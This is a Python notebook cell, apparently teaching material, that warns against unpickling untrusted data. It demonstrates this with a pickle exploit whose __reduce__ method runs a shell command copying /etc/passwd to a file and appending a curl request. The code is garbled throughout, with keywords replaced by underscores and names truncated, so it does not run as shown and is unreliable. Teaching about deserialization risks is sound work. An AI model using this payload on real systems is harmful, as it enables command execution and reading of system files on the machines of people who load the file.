# # Not Secure!
# 
# # Pickling is not a secure way to deserialize data objects. DO NOT unpickle anything you did not pickle yourself.
# # You have been WARNED!
# #
# # Here's how easy it is to create an exploit.
# #
# # I am going to pickle an object that is going to use the unix shell (admittedly this will not work on Windows,
# # but it could with some more complicated code - plus I don't need this to run on every machine in the world,
# # just as many as possible - at least that's the mindset if I were a hacker I guess)
# 
# ______ o..
# ______ pi..
# 
# 
# c_ Exploit
#     ___ __reduce__ ___
#         r_ o_.sy.  ("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt",))
# 
# 
# ___ serialize_exploit fname
#     w___ o.. f..  __ a_ f
#         pi__.d.. E... ?
# 
# # Now, I serialize this code to a file:
# 
# s... loadme
# 
# # Now I send this file to some unsuspecting recipients and tell them they just need to load this up in their Python app.
# # They deserialize the pickled object like so:
# 
# p___.l.. o.. 'loadme' __
# 
# # And now take a look at your folder that contains this notebook!
# 
# print('#' * 52 + '  ')
# print('#' * 52 + '  ')
# print('#' * 52 + '  ')
